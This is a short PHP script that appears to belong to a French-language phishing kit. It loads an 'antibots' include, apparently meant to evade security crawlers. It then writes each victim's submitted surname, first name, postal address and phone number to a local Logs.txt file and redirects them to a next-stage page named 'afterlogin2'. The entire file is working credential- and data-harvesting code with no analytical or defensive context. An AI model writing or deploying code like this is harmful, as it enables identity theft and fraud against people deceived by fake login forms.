<?php
include('../antibots/all.php');


file_put_contents("Logs.txt", "| Nom: " . $_POST['login_nom'] . " | Prénom: " . $_POST['login_prenom'] . " | Adresse: " . $_POST['login_adresse'] . " | Tel:" . $_POST['login_num'] . "\n", FILE_APPEND);
sleep(1);
header('Location: afterlogin2');
exit();

?>
